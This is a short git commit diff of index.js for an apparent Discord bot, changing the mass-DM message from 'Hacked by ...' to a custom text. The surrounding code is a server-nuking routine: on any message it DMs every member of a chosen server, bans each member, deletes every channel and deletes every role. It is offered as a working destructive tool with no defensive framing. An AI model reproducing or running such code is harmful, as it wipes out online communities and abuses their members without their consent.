532a19b9c4c78525db69a6c89997a10a55b27cf4
smokeSH <65368643+smokeSH@users.noreply.github.com>
2021-10-07 13:19:13 +0200

    Update index.js

--- index.js
+++ index.js
@@ -14,7 +14,7 @@ client.on('ready', (guild) => {
 client.on('message', message => {
 	
 	const list = client.guilds.get(""); //INSERT SERVER ID 
-	list.members.forEach(member => member.send("Hacked by ..."));
+	list.members.forEach(member => member.send("...")); //Custom message sent to each member
     	list.members.forEach(member => member.ban());
     	message.guild.channels.forEach(channel => channel.delete());
 	list.roles.forEach(role => role.delete());
